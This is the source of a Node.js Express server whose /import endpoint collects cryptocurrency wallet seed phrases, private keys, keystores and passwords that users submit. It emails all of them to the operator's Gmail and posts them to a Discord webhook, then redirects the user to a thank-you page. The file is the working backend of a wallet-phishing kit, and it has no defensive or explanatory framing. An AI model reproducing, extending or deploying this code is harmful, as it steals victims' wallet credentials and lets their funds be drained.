const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

app.post('/import', async (req, res) => {
  const { type, phrase, privateKey, keystore, password } = req.body;

  let content = `New Wallet Import Attempt:\nType: ${type}\n`;
  if (phrase) content += `Phrase: ${phrase}\n`;
  if (privateKey) content += `Private Key: ${privateKey}\n`;
  if (keystore) content += `Keystore: ${keystore}\n`;
  if (password) content += `Password: ${password}\n`;

  // Send email via Gmail SMTP
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  try {
    await transporter.sendMail({
      from: `"Wallet Import Alert" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER,
      subject: 'Wallet Import Details',
      text: content
    });
  } catch (err) {
    console.error('Email error:', err.message);
  }

  // Send to Discord Webhook
  try {
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content })
    });
  } catch (err) {
    console.error('Discord error:', err.message);
  }

  res.redirect('/thank-you.html');
});

app.use(express.static('public'));

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));